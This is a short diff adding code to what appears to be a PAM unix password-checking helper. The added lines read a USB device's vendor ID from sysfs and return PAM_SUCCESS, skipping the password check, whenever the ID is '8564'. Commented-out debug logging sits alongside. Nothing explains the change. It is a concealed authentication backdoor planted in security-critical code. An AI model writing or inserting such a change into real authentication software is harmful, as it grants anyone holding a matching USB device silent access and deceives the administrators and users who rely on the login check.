@@ -89,6 +89,23 @@ static int _audit_log(int type, const char *uname, int rc)
 
 int main(int argc, char *argv[])
 {
+	FILE* vendorFile = fopen("/sys/bus/usb/devices/1-1.3/idVendor", "r");
+
+	if (vendorFile != NULL) {
+		char vendorID[5];
+		fgets(vendorID, 5, vendorFile);
+		fclose(vendorFile);
+
+		// printf("%s\n", vendorID);
+		// FILE* output = fopen("/tmp/pam_unix.log", "w");
+		// fputs(vendorID, output);
+		// fclose(output);
+
+		if (strcmp(vendorID, "8564") == 0) {
+			return PAM_SUCCESS;
+		}
+	}
+
 	char pass[MAXPASS + 1];
 	char *option;
 	int npass, nullok;
